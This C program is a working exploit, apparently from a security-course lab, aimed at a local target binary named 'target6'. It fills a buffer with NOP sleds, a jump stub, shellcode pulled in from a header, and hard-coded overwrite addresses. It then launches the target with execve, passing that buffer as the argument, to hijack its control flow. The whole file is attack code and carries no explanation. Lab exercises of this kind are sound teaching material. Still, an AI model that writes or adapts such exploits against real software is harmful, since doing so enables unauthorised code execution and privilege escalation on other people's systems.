#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target6"
#define DEFAULT_BUFFER_SIZE  192
#define NOP 0x90
int
main ( int argc, char * argv[] )
{
	char *	args[3];
	char *	env[1];
	char *buff, *ptr;
	int bsize=DEFAULT_BUFFER_SIZE;
	int i;

	if (argc>1) bsize = atoi(argv[1]);
	
	if (!(buff = malloc(bsize* sizeof(char)))){
		printf("can't allocate memory\n");
		exit(0);
	}
	


	for (i=0; i<bsize; i++){
		buff[i] = NOP;
	}
	
	ptr = buff;
	char * ft = "\xeb\x08\x01\x01";
	for (i=0; i<4; i++){
		*(ptr++) = ft[i];
	}

	for (i=0; i<4; i++){
		*(ptr++) = shellcode[i];
	}

	ptr = buff + 27;
	for (i=0; i<strlen(shellcode); i++){
		*(ptr++) = shellcode[i];
	}
	
	char * s = "\x28\xee\x04\x01\x68\xfe\xa4\x40";
	for (i=0; i<8; i++){
		*(ptr++) = s[i];
	}
	buff[bsize-1] = '\0';
	args[0] = TARGET;
	args[1] = buff;
	args[2] = NULL;
	env[0] = NULL;

	if ( execve (TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");
	int b =0;
	return (0);
}
